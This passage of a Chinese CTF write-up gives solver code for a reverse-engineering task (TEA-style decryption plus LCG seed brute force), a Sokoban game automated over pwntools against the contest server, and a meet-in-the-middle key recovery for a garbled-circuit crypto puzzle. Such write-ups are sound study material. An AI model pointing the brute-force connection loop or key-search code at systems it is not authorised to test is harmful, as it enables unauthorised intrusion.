</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exp.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> delta<span style="color:#f92672">=-</span><span style="color:#ae81ff">0x61c88647</span>;
<span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">65</span>];
<span style="color:#66d9ef">char</span> tmp[<span style="color:#ae81ff">256</span>];
<span style="color:#66d9ef">char</span> tmp1[<span style="color:#ae81ff">4096</span>];
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> seed;
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">mRand</span>()
{
	seed<span style="color:#f92672">=</span>seed<span style="color:#f92672">*</span><span style="color:#ae81ff">0x41c64e6d</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x3039</span>;
	<span style="color:#66d9ef">return</span> (seed<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">0x21</span>)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">0x31</span>;
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">tea1</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str)
{
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4096</span>;j<span style="color:#f92672">+=</span><span style="color:#ae81ff">8</span>)
		{
			<span style="color:#66d9ef">auto</span> <span style="color:#f92672">*</span>ptr<span style="color:#f92672">=</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(str<span style="color:#f92672">+</span>j);
			<span style="color:#66d9ef">auto</span> t1<span style="color:#f92672">=</span>ptr[<span style="color:#ae81ff">0</span>];
			<span style="color:#66d9ef">auto</span> t2<span style="color:#f92672">=</span>ptr[<span style="color:#ae81ff">1</span>];
			<span style="color:#66d9ef">int</span> sum<span style="color:#f92672">=</span>delta<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>;
			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;k<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>;k<span style="color:#f92672">++</span>)
			{
      			t2 <span style="color:#f92672">-=</span> t1 <span style="color:#f92672">+</span> sum <span style="color:#f92672">^</span> (t1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1A2B3C4D</span> <span style="color:#f92672">^</span> (t1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xCC1122AA</span>;
				t1 <span style="color:#f92672">-=</span> (t2<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x11222233</span> <span style="color:#f92672">^</span> (t2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaabbccdd</span> <span style="color:#f92672">^</span> sum <span style="color:#f92672">+</span>t2;
				sum<span style="color:#f92672">-=</span>delta;
			}
			ptr[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>t1;
			ptr[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>t2;
		}
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">tea2</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> str)
{
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4096</span>;j<span style="color:#f92672">+=</span><span style="color:#ae81ff">8</span>)
		{
			<span style="color:#66d9ef">auto</span> <span style="color:#f92672">*</span>ptr<span style="color:#f92672">=</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(str<span style="color:#f92672">+</span>j);
			<span style="color:#66d9ef">auto</span> t1<span style="color:#f92672">=</span>ptr[<span style="color:#ae81ff">0</span>];
			<span style="color:#66d9ef">auto</span> t2<span style="color:#f92672">=</span>ptr[<span style="color:#ae81ff">1</span>];
			<span style="color:#66d9ef">int</span> sum<span style="color:#f92672">=</span>delta<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>;
			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;k<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">8</span>;k<span style="color:#f92672">++</span>)
			{
      			sum<span style="color:#f92672">-=</span>delta;
				t1 <span style="color:#f92672">+=</span>  t2 <span style="color:#f92672">+</span> sum <span style="color:#f92672">^</span> (t2 <span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x11222233</span> <span style="color:#f92672">^</span> (t2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaabbccdd</span>;
      			t2 <span style="color:#f92672">+=</span>(t1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1A2B3C4D</span> <span style="color:#f92672">^</span> (t1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xCC1122AA</span> <span style="color:#f92672">^</span> sum <span style="color:#f92672">+</span>t1;
			}
			ptr[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>t1;
			ptr[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>t2;
		}
}
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">panic</span>()
{
	printf(<span style="color:#e6db74">&#34;failed&#34;</span>);
	exit(<span style="color:#ae81ff">0</span>);
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>;i<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">--</span>)
	{
		memcpy(tmp1,target1,<span style="color:#ae81ff">4096</span>);
		memcpy(target1,target2,<span style="color:#ae81ff">4096</span>);
		memcpy(target2,tmp1,<span style="color:#ae81ff">4096</span>);
		memcpy(tmp,target1<span style="color:#f92672">+</span>(i<span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>),<span style="color:#ae81ff">256</span>);
		memcpy(target1<span style="color:#f92672">+</span>(i<span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>),target2<span style="color:#f92672">+</span>(<span style="color:#ae81ff">15</span><span style="color:#f92672">-</span>i)<span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>,<span style="color:#ae81ff">256</span>);
		memcpy(target2<span style="color:#f92672">+</span>(<span style="color:#ae81ff">15</span><span style="color:#f92672">-</span>i)<span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>,tmp,<span style="color:#ae81ff">256</span>);	
		tea1(target1);
		tea2(target2);

	}
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x80</span>;i<span style="color:#f92672">++</span>)
		printf(<span style="color:#e6db74">&#34;0x%02x &#34;</span>,(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)target2[i]);
	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x20</span>;i<span style="color:#f92672">++</span>)
	{
		<span style="color:#66d9ef">int</span> an<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
		<span style="color:#66d9ef">for</span> (an<span style="color:#f92672">=</span>i;an<span style="color:#f92672">&lt;</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">0xff</span>;an<span style="color:#f92672">++</span>)
		{
			seed<span style="color:#f92672">=</span>an;
			<span style="color:#66d9ef">bool</span> ch<span style="color:#f92672">=</span>true;
			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x80</span>;j<span style="color:#f92672">++</span>)
			{
				<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> aa<span style="color:#f92672">=</span>mRand()<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>;
				<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> bb<span style="color:#f92672">=</span>target1[i<span style="color:#f92672">*</span><span style="color:#ae81ff">0x80</span><span style="color:#f92672">+</span>j]<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>;
				<span style="color:#66d9ef">if</span> (aa<span style="color:#f92672">!=</span>bb)
				{
					ch<span style="color:#f92672">=</span>false;
					<span style="color:#66d9ef">break</span>;
				}
			}
			<span style="color:#66d9ef">if</span> (ch)
				<span style="color:#66d9ef">break</span>;
		}
		printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,an);
		<span style="color:#66d9ef">if</span> (an<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0xff</span>)
		{
			panic();
		}
		str[i]<span style="color:#f92672">=</span>an<span style="color:#f92672">-</span>i;
	}
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x20</span>;i<span style="color:#f92672">++</span>)
	{
		<span style="color:#66d9ef">int</span> an<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
		<span style="color:#66d9ef">for</span> (an<span style="color:#f92672">=</span>i;an<span style="color:#f92672">&lt;</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">0xff</span>;an<span style="color:#f92672">++</span>)
		{
			seed<span style="color:#f92672">=</span>an;
			<span style="color:#66d9ef">bool</span> ch<span style="color:#f92672">=</span>true;
			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x80</span>;j<span style="color:#f92672">++</span>)
			{
				<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> aa<span style="color:#f92672">=</span>mRand()<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>;
				<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> bb<span style="color:#f92672">=</span>target2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">0x80</span><span style="color:#f92672">+</span>j]<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>;
				<span style="color:#66d9ef">if</span> (aa<span style="color:#f92672">!=</span>bb)
				{
					ch<span style="color:#f92672">=</span>false;
					<span style="color:#66d9ef">break</span>;
				}
			}
			<span style="color:#66d9ef">if</span> (ch)
				<span style="color:#66d9ef">break</span>;
		}
		printf(<span style="color:#e6db74">&#34;%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,an);
		<span style="color:#66d9ef">if</span> (an<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0xff</span>)
		{
			panic();
		}
		str[i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>]<span style="color:#f92672">=</span>an<span style="color:#f92672">-</span>i;
	}
	printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str);
	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 } 
</code></pre></div><h3 id="sycgame">SycGame</h3>
<p>推箱子游戏</p>
<p>github 找了个自动求解脚本，然后在脚本里加一个 alarm，求解一次的时间超过 3s 就自动退出</p>
<p><a class="link" href="https://github.com/tonyling/skb-solver"  target="_blank" rel="noopener"
    >https://github.com/tonyling/skb-solver</a></p>
<p>题目的程序和 github 上的脚本写的都有点问题，最后大概是脚本有 1/5 到 1/10 的概率求解出一轮，接下来爆破一波就行（服务器第一天不太稳定，爆破完不回显 flag&hellip;）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> sympy.ntheory.modular <span style="color:#f92672">import</span> isprime
<span style="color:#f92672">import</span> traceback
context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bprint</span>(lst):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> lst:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
            print(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%4d</span><span style="color:#e6db74"> &#34;</span><span style="color:#f92672">%</span>j,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
        print(<span style="color:#e6db74">&#39;&#39;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fprint</span>(lst):
    mpc<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1</span>:<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#ae81ff">0</span>:<span style="color:#e6db74">&#39;#&#39;</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:<span style="color:#e6db74">&#39;@&#39;</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>:<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:<span style="color:#e6db74">&#39;$&#39;</span>}
    target<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;20</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> lst:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
            target<span style="color:#f92672">+=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%c</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>mpc[j])
        target<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
    open(<span style="color:#e6db74">&#34;test.txt&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>)<span style="color:#f92672">.</span>write(target)
maxn<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">True</span>):
    <span style="color:#66d9ef">try</span>:
        p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;124.70.152.166&#34;</span>,<span style="color:#ae81ff">1448</span>)
        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>)
        p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
            buffer<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
            _mp<span style="color:#f92672">=</span>list(map(int,buffer<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)))
            mp0<span style="color:#f92672">=</span>[(<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">if</span> isprime(i) <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">if</span> i<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> _mp]
            mp<span style="color:#f92672">=</span>[[mp0[i<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]
            mpback<span style="color:#f92672">=</span>[[mp0[i<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]
            bprint(mp)
            fprint(mp)
            data<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;./a.out test.txt&#39;</span>)<span style="color:#f92672">.</span>read()
            print(data)
            p<span style="color:#f92672">.</span>send(data<span style="color:#f92672">.</span>encode())
            p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:&#34;</span>)
            p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
            rec<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
            print(rec)
            maxn<span style="color:#f92672">=</span>max(maxn,i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
        i<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        buffer<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>decode()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
        _mp<span style="color:#f92672">=</span>list(map(int,buffer<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)))
        mp0<span style="color:#f92672">=</span>[(<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">if</span> isprime(i) <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">if</span> i<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> _mp]
        mp<span style="color:#f92672">=</span>[[mp0[i<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]
        mpback<span style="color:#f92672">=</span>[[mp0[i<span style="color:#f92672">*</span><span style="color:#ae81ff">20</span><span style="color:#f92672">+</span>j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>)]
        bprint(mp)
        fprint(mp)
        data<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;./a.out test.txt&#39;</span>)<span style="color:#f92672">.</span>read()
        print(data)
        p<span style="color:#f92672">.</span>send(data<span style="color:#f92672">.</span>encode())
        dt<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span>)
        print(<span style="color:#e6db74">&#34;recieved:&#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
        print(dt)
        i<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
        p<span style="color:#f92672">.</span>interactive()
    <span style="color:#66d9ef">except</span>:
        <span style="color:#66d9ef">if</span> (i<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>):
            traceback<span style="color:#f92672">.</span>print_exc()
        <span style="color:#66d9ef">if</span> (i<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span>):
            <span style="color:#66d9ef">break</span>
        p<span style="color:#f92672">.</span>close()
        print(<span style="color:#e6db74">&#34;maxn:</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>maxn)
        <span style="color:#66d9ef">pass</span>

</code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="ciruit-map">ciruit map</h3>
<p>是个混淆电路，目标 flag 最终就是要求出 keys</p>
<p>电路中多给了一个值是 validation，用这个值可以构造中间相遇攻击，从而将秘钥爆破空间缩小到 <code>2**24</code>，pypy3 跑然后在密钥空间中验证电路是否能通，能通的就是正确的秘钥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> block_cipher <span style="color:#f92672">import</span> encrypt_data, decrypt_data, decrypt
<span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> defaultdict
<span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm
G_Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">5</span>: [(<span style="color:#ae81ff">13303835</span>, <span style="color:#ae81ff">2123830</span>),
            (<span style="color:#ae81ff">2801785</span>, <span style="color:#ae81ff">11303723</span>),
            (<span style="color:#ae81ff">13499998</span>, <span style="color:#ae81ff">248615</span>),
            (<span style="color:#ae81ff">13892520</span>, <span style="color:#ae81ff">7462011</span>)],
            <span style="color:#ae81ff">6</span>: [(<span style="color:#ae81ff">3244202</span>, <span style="color:#ae81ff">918053</span>),
            (<span style="color:#ae81ff">3277177</span>, <span style="color:#ae81ff">6281266</span>),
            (<span style="color:#ae81ff">1016382</span>, <span style="color:#ae81ff">7097624</span>),
            (<span style="color:#ae81ff">10016472</span>, <span style="color:#ae81ff">13600867</span>)],
            <span style="color:#ae81ff">7</span>: [(<span style="color:#ae81ff">5944875</span>, <span style="color:#ae81ff">3442862</span>),
            (<span style="color:#ae81ff">7358369</span>, <span style="color:#ae81ff">8423543</span>),
            (<span style="color:#ae81ff">6495696</span>, <span style="color:#ae81ff">9927178</span>),
            (<span style="color:#ae81ff">13271900</span>, <span style="color:#ae81ff">11855272</span>)],
            <span style="color:#ae81ff">9</span>: [(<span style="color:#ae81ff">5333988</span>, <span style="color:#ae81ff">87113</span>),
            (<span style="color:#ae81ff">9375869</span>, <span style="color:#ae81ff">11687470</span>),
            (<span style="color:#ae81ff">5011062</span>, <span style="color:#ae81ff">14981756</span>),
            (<span style="color:#ae81ff">2509493</span>, <span style="color:#ae81ff">12330305</span>)]}

print(<span style="color:#e6db74">&#39;[!] generating lookup table...&#39;</span>)
ENCRYPTIONS_OF_ZERO <span style="color:#f92672">=</span> defaultdict(list)
<span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">24</span>)):
    ct <span style="color:#f92672">=</span> encrypt_data(<span style="color:#ae81ff">0</span>, key)
    ENCRYPTIONS_OF_ZERO[ct]<span style="color:#f92672">.</span>append(key)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">meet_in_the_middle</span>(ct):
    print(<span style="color:#e6db74">&#39;[!] performing meet-in-the-middle attack for&#39;</span>, ct)
    possible <span style="color:#f92672">=</span> defaultdict(list)
    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">24</span>)):
        dec <span style="color:#f92672">=</span> decrypt_data(ct, key)
        <span style="color:#66d9ef">if</span> dec <span style="color:#f92672">in</span> ENCRYPTIONS_OF_ZERO:
            possible[key] <span style="color:#f92672">=</span> ENCRYPTIONS_OF_ZERO[dec]
    <span style="color:#66d9ef">return</span> possible
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_keys</span>(Z, C):
    print(<span style="color:#e6db74">&#39;[!] recovering keys...&#39;</span>)
    z1, z2, z3, z4 <span style="color:#f92672">=</span> Z
    c1, c2, c3, c4 <span style="color:#f92672">=</span> C
    <span style="color:#66d9ef">for</span> b0 <span style="color:#f92672">in</span> tqdm(z1):
        <span style="color:#66d9ef">for</span> a0 <span style="color:#f92672">in</span> z1[b0]:
            p1 <span style="color:#f92672">=</span> decrypt(c1, a0, b0)
            <span style="color:#66d9ef">for</span> c,z <span style="color:#f92672">in</span> zip([c2, c3, c4], [z2, z3, z4]):
                <span style="color:#66d9ef">for</span> a1 <span style="color:#f92672">in</span> z[b0]:
                    <span style="color:#66d9ef">if</span> p1 <span style="color:#f92672">==</span> decrypt(c, a1, b0):
                        b1 <span style="color:#f92672">=</span> recover_keys_part2(Z, C, a0, b0)
                        <span style="color:#66d9ef">if</span> b1:
                            print(c1)
                            print(c)
                            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;a0 = </span><span style="color:#e6db74">{</span>a0<span style="color:#e6db74">}</span><span style="color:#e6db74">, b0 = </span><span style="color:#e6db74">{</span>b0<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
                            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;a1 = </span><span style="color:#e6db74">{</span>a1<span style="color:#e6db74">}</span><span style="color:#e6db74">, b1 = </span><span style="color:#e6db74">{</span>b1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
                            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
                
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_keys_part2</span>(Z, C, a0, b0):
    z1, z2, z3, z4 <span style="color:#f92672">=</span> Z
    c1, c2, c3, c4 <span style="color:#f92672">=</span> C
    <span style="color:#66d9ef">for</span> c,z <span style="color:#f92672">in</span> zip([c2,c3,c4], [z2,z3,z4]):
        <span style="color:#66d9ef">for</span> b1 <span style="color:#f92672">in</span> z:
            <span style="color:#66d9ef">if</span> a0 <span style="color:#f92672">in</span> z[b1] <span style="color:#f92672">and</span> decrypt(c, a0, b1) <span style="color:#f92672">==</span> decrypt(c1, a0, b0):
                <span style="color:#66d9ef">return</span> b1
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
<span style="color:#75715e"># Z是四个字典，键是key2, 值是key1</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [<span style="color:#ae81ff">7</span>]:
    Z <span style="color:#f92672">=</span> [meet_in_the_middle(G_Table[i][j][<span style="color:#ae81ff">1</span>]) <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)]
    C <span style="color:#f92672">=</span> [g[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> g <span style="color:#f92672">in</span> G_Table[i]]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">if</span> recover_keys([Z[i]] <span style="color:#f92672">+</span> Z[:i] <span style="color:#f92672">+</span> Z[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:], [C[i]] <span style="color:#f92672">+</span> C[:i] <span style="color:#f92672">+</span> C[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]):
            <span style="color:#66d9ef">break</span>
<span style="color:#75715e">###############################################################</span>
<span style="color:#f92672">from</span> block_cipher <span style="color:#f92672">import</span> decrypt
G_Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">5</span>: [(<span style="color:#ae81ff">13303835</span>, <span style="color:#ae81ff">2123830</span>),
            (<span style="color:#ae81ff">2801785</span>, <span style="color:#ae81ff">11303723</span>),
            (<span style="color:#ae81ff">13499998</span>, <span style="color:#ae81ff">248615</span>),
